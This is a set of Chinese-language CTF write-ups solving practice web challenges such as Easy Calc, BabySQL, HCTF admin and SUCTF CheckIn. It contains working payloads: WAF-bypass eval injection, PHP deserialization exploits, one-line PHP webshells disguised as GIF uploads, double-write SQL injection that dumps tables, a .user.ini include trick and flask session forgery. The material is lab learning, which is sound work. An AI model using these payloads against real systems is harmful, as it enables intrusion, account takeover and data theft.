# [RoarCTF 2019]Easy Calc

打开靶机，是一个提供计算的页面，查看源码，发现提示<!--I've set up WAF to ensure security.-->，同样发现了计算的JS脚本源码,如下

```html
<script>
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
</script>
```

其中有`calc.php?`，访问得到php代码，进行审计

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];//num传参
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
    	//黑名单，被过滤的内容，因为单、双、反引号都被过滤了，所以命令执行不能用
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }//遍历黑名单元素，若$str中存在黑名单元素，则不让执行后面的eval()
        }
        eval('echo '.$str.';');//构造想要执行的php代码
}
?>
```

尝试`calc.php?num=phpinfo()`，结果403禁止访问，但如果传的参为数字可以正常回显，这里存在一个WAF，我们这里可以利用PHP字符串解析特性绕过，学到了，因为命令执行的函数不能用，这里用scandir()函数读取目录信息，但单双引号被过滤了，不能用`“/”`，这里又用到`chr(47)`绕过，因为不能直接输出数组数据，我们用到var_dump()函数打印，`calc.php? num=var_dump(scandir(chr(47)))`，发现`f1agg`这个文件，然后就是读取文件，这里同样用chr()绕过，成功拿到flag

```
calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

# [极客大挑战 2019]Http

打开靶机，网页上提示“HERE IS THE SECRET WEBSITE OF THE SYCLOVER”，有个隐藏网页，查看源码，找到`Secret.php`，访问页面回显为`It doesn't come from 'https://www.Sycsecret.com'`，显然考察HTTP协议，BP抓包，添加`Referer: https://www.Sycsecret.com`，发送得到`Please use "Syclover" browser`，改`User-Agent: Syclover`，再发送得到`No!!! you can only read this locally!!!`，伪造IP，添加`X-Forwarded-For: 127.0.0.1`，最终得到flag

# [极客大挑战 2019]PHP

打开靶机，页面显示里这句话——“所以我有一个良好的备份网站的习惯”，说明存在备份文件，用dirsearch扫描目录，果然找到了`/www.zip`，把备份文件下载下来，获得如下三段php源码，并进行代码审计

```php
class.php
<?php
include 'flag.php';
error_reporting(0);
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){//这个方法会导致$username的值变为guest，所以这里要绕过
        $this->username = 'guest';
    }

    function __destruct(){//当$password='100'&$username='admin'时，打印flag
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();          
        }
    }
}
?>
```

```php
flag.php
<?php
$flag = 'Syc{dog_dog_dog_dog}';
?>//这个文件没用
```

```php
index.php
<?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);//对$select进行反序列化
?>
```

编写exp

```php
<?php
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';
//这里要注意private序列化的格式，运行结果的空格其实是%00(空字符的url编码)，空格则是%20
    
    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
}
    $a = new Name('admin', '100');
	echo var_dump(serialize($a));
//这里结果进行url编码，且把Name后面的2改为3，让属性个数的值大于真实属性个数，从而绕过__wakeup()
?>
```

最终`paylaod：url/index.php?select=O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;s:3:"100";}`

# [极客大挑战 2019]Upload

文件上传，先传一个一句话木马的php文件，无法上传，回显为“Not image!”，说明要图片类型的文件，把后缀改为`.jpg`(此时`Content-Type: image/jpeg`)，还是无法上传，回显为“NO! HACKER! your file included '<?'”，它过滤了php代码标志，那就进行绕过，`<script language=php>eval($_POST['cmd']);</script>`，竟然还是无法上传成功，回显为“Don't lie to me, it's not image at all!!!”，这里应该检测了文件头，那就利用`GIF89a`图片欺诈文件，上传成功

```php
GIF89a
<script language=php>eval($_POST['cmd']);</script>
```

但是因为jpg文件不能运行代码，所以我们要修改后缀，保持`Content-Type: image/jpeg`，改为`.phtml`(phtml一般是指嵌入了php代码的html文件，但是同样也会作为php解析)，下一步就是要知道文件上传的路径，查看源码没什么发现，一般默认上传的文件会保存在`upload`文件下，于是蚁剑直连`url/upload/文件名`，最后在根目录下拿到flag

# [极客大挑战 2019]BabySQL

如之前一样尝试`username=admin' or 1=1#`，但报错了，根据报错结果，说明过滤了`or`，双写能成功登录，猜测后端代码存在类似替换函数，成功登录后，接下来应该是基础的爆库，表，列的操作，但`union`，`select`都被过滤了，双写同样能绕过。

爆库名，库名为"geek"

```
password=1%27ununionion seselectlect 1,2,database()%23
```

报表名，表名为"b4bsql,geekuser"

```
password=1%27ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()%23
//from,where也过滤了，同时information中有or，也双写一下
```

爆列名，列名为"id,username,password,id,username,password"

```
password=1%27ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database()%23
```

爆数据，拿到flag

```
password=1%27ununionion seselectlect 1,2,group_concat(passwoorrd) frfromom b4bsql%23
```

# [ACTF2020 新生赛]Upload

文件上传，尝试一句话木马的php文件，JS弹窗提示要jpg、png、gif的图片，

尝试抓包上传php绕过前端验证，不成功，还存在其它检测，不改后缀改`Content-Type: image/jpeg`上传还是失败，这应该检测了文件扩展名，尝试对后缀名php进行大小写绕过，好家伙，成功上传，同时给出了路径，接下来就是蚁剑直连，但是失败了，很迷惑，尝试其它后缀名phtml，这个成功了。

询问了一下认识的师傅，终于弄明白了，这里是因为Windows对大小写不敏感，但Linux对大小写敏感，在Linux中，`1.pHp`不能被当作php文件解析执行，这里后端用了黑名单校验，没有过滤大小写，所以能上传成功，但对方环境为Linux，文件不能执行，所以蚁剑直连失败了。学到了！(大小写绕过只适用于Windows)

# [ACTF2020 新生赛]BackupFile

打卡靶机，页面回显为“Try to find out source file!”，题目意思又为“备份文件”，很容易就想到用dirsearch扫描网站目录，果不其然发现源文件`/index.php.bak`，将文件下载，得到源码

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);//将$key的值强制转换为整数值
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }//因为是'=='，所以这里应该利用php的弱比较，$str会变为123进行比较
}
else {
    echo "Try to find out source file!";
}
```

构造`payload：url?key=123`

# [HCTF 2018]admin

打开靶机，各有一个登录和注册页面，有注册联想到之前做到过的SQL约束攻击，尝试注册`admin(n*空格)1`，但请求不成功，猜测做了限制，同样的SQL注入也不行，注册一个普通账号登录，在源码里看到注释<!-- you are not admin -->，显然目的就是要以`admin`账号登录，随便尝试一下`123`，`1234`等密码，`123`竟然就是密码，真就弱口令呗。

显然这题并没有这么简单，实在没有思路，就找WP学习一下。这里就分析一下两种解法。

解法一：flask session伪造

当注册一个普通账号登录时，存在“index”，“post”，“change password”，“logout”四个页面，仔细查看“change password”，会发现注释<!-- https://github.com/woadsl1234/hctf_flask/ -->，自己做的时候压根没发现，果然源码还是要仔细看啊！打开链接，是一个flask项目，能找到路由文件`routes.py`，如下为部分代码，

```python
@app.route('/register', methods = ['GET', 'POST'])
def register():

    if current_user.is_authenticated:
        return redirect(url_for('index'))

    form = RegisterForm()
    if request.method == 'POST':
        name = strlower(form.username.data)#将name小写转换，ᴬdmin
        if session.get('image').lower() != form.verify_code.data.lower():
            flash('Wrong verify code.')
            return render_template('register.html', title = 'register', form=form)
        if User.query.filter_by(username = name).first():
            flash('The username has been registered')
            return redirect(url_for('register'))
        user = User(username=name)
        user.set_password(form.password.data)
        db.session.add(user)
        db.session.commit()
        flash('register successful')
        return redirect(url_for('login'))
    return render_template('register.html', title = 'register', form = form)

@app.route('/login', methods = ['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('index'))

    form = LoginForm()
    if request.method == 'POST':
        name = strlower(form.username.data)#将name小写转换，Admin
        session['name'] = name
        user = User.query.filter_by(username=name).first()
        if user is None or not user.check_password(form.password.data):
            flash('Invalid username or password')
            return redirect(url_for('login'))
        login_user(user, remember=form.remember_me.data)
        return redirect(url_for('index'))
    return render_template('login.html', title = 'login', form = form)

@app.route('/change', methods = ['GET', 'POST'])
def change():
    if not current_user.is_authenticated:
        return redirect(url_for('login'))
    form = NewpasswordForm()
    if request.method == 'POST':
        name = strlower(session['name'])#将name小写转换，admin
        user = User.query.filter_by(username=name).first()
        user.set_password(form.newpassword.data)
        db.session.commit()
        flash('change successful')
        return redirect(url_for('index'))
    return render_template('change.html', title = 'change', form = form)

def strlower(username):
    username = nodeprep.prepare(username)
    return username
```

还发现`index.html`这个文件，代码如下，

```html
{% include('header.html') %}
{% if current_user.is_authenticated %}
<h1 class="nav">Hello {{ session['name'] }}</h1>
{% endif %}
{% if current_user.is_authenticated and session['name'] == 'admin' %}
<h1 class="nav">hctf{xxxxxxxxx}</h1>
{% endif %}
<!-- you are not admin -->
<h1 class="nav">Welcome to hctf</h1>

{% include('footer.html') %}
```

审计代码，可以发现`/login`是将获取到的name存入session里的name参数，再与数据库里的name进行比较，从而验证登录，又根据`index.html`里的信息，只要session里的name参数等于admin，就会回显flag，所以这里要伪造session。

这里要知道一些关于flask这个框架的知识。flask的session是存储在客户端cookie中的，对数据进行一系列的序列化操作。而最后一步flask仅仅对数据进行了签名，不知道secret_key的情况下，是无法伪造签名的。

所以我们继续浏览文件，发现`config.py`这个配置文件，就找到了`SECRET_KEY=ckj123`

```python
import os

class Config(object):
    SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'
    SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test'
    SQLALCHEMY_TRACK_MODIFICATIONS = True
```

注册普通账号登录，抓包得到session，使用flask_session_cookie_manager这一脚本(github上找的)进行解密，再把name的参数值换为admin进行加密，替换session发送包，拿到flag

解法二：[unicode同形字引起的安全问题](http://xdxd.love/2016/10/17/unicode同形字引起的安全问题/)

仔细观察`routes.py`，发现存在`strlower()`这个函数，并且进行了定义，twisted库的`nodeprep.prepare()`会将内容转为小写，且将其它类的编码转为ASCII；我们提交（可以查到各个字母的替换类型【https://unicode-table.com/en/1D43/】【https://www.compart.com/en/unicode/】）“ᴬ”`nodeprep.prepare()`函数转为“A”，再次（二次）`nodeprep.prepare()`函数会将“A”转为“a”；这是twisted库函数的特点。所以可以利用这个特点注册`ᴬdmin`，登录修改密码，然后再次登录就可以用`admin`的账号，修改的密码登录

# [极客大挑战 2019]BuyFlag

打开靶机，右侧`MENU`存在`PAYFLAG`，访问并查看源码，存在代码如下，

```php
<!--
	~~~post money and password~~~//要post$money和$password两个值
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";//$password不能是数字，利用弱类型绕过，$password=404a
	}
}
-->
```

并且页面提示如下，

```
FLAG
FLAG NEED YOUR 100000000 MONEY

ATTENTION
If you want to buy the FLAG:
You must be a student from CUIT!!!
You must be answer the correct password!!!

Only Cuit's students can buy the FLAG
```

抓包，发现请求头中cookie中有参数`user=0`，爆破发现只有0和1回显不同，改参数`user=1`，满足第一个条件，post传参`password=404a&money=100000000`，money的值的长度太长，那就用科学计数法`password=404a&money=1e9`绕过长度限制，成功拿到flag

# [BJDCTF2020]Easy MD5

打开靶机，BP抓包，返回头中存在hint，`Hint: select * from 'admin' where password=md5($pass,true)`

显然这里需要知道`$pass`的值，但是搞了半天，还是没什么思路，只能去看BUU给出了题目的源码，这里看源码输入必须等于`ffifdyop`，实在令人迷惑，根据hint，如果`$pass=ffifdyop`，会得到如下

```
select * from 'admin' where password=''or'6蒥欓!r,b'
```

这里就会发现构成了一句永真句，所以这里提示的意思是想办法让`$pass`经过md5转换构成永真式，这里的原理呢，就是数据库会把16进制转为ASCII解释（这里也可以直接理解成md5后，mysql自动把md5值当成hex转化成字符串了）

输入`$pass`后，查看html源码得到，典型的`md5()`绕过

```php
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){//payload：?a[]=1&b[]=2
    // wow, glzjin wants a girl friend.
-->
```

然后得到，绕过同上，拿到flag

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}//payload：param1[]=1&param2[]=2
```

# [SUCTF 2019]CheckIn

打开靶机，文件上传，抓包尝试上传一句话木马，后缀名为`php,php3,phtml`等，但这些后缀都被过滤了，再尝试`jpg`，这个好像可以，但检测了文件内容，不能有标志符`<?`，于是进行简单的绕过

```php
<script language=php>eval($_POST['cmd']);</script>
```

回显为`exif_imagetype:not image!`，`exif_imagetype() ` 是个判断图像类型的函数，它通过读取一个图像的第一个字节并检查其签名来判断。所以要添加文件头`GIF89a`，可以上传成功，并且给出了文件路径和目录，可是无法上传可执行文件，还是没用。

所以查看WP，这里要用到`.user.ini`文件的知识，上传一个`.user.ini`文件，写入如下配置

```
GIF89a
auto_prepend_file=123.gif
//指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。需要当前上传的目录下有php文件，此处有index.php
```

最后蚁剑直连（地址为`url/uploads/bda605feb930ea234388b9cc4e2fbdea/index.php`）对这地址有点不解，在根目录下拿到flag

# [ZJCTF 2019]NiZhuanSiWei

打开靶机，代码审计

```php
<?php  
$text = $_GET["text"];//text=php://input [POST DATA]:welcome to the zjctf
$file = $_GET["file"];//file=php://filter/read=convert.base64-encode/resource=useless.php
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){//$file过滤了flag字符串
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

观察到有`file_get_contents()`，用`php://input`POST数据，然后直接执行文件`file=useless.php`，无回显，尝试`php://filter`读取源码，得到base64加密代码，解码得

```php
<?php  
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); //这里应该是要读取flag.php这个文件
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

结合两处代码，知道要利用`$password`读取到`flag.php`，写脚本进行序列化

```php
<?php
class Flag{  //flag.php
    public $file='flag.php';
    public function __tostring(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
            echo "<br>";
            return ("U R SO CLOSE !///COME ON PLZ");
        }
    }
}
$a=new Flag();
echo serialize($a);//O:4:"Flag":1:{s:4:"file";s:8:"flag.php";} 
?> 
```

最后`file=useless.php&password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D`，这里`file=useless.php`是要执行里面的代码，而上面是用来读取源码

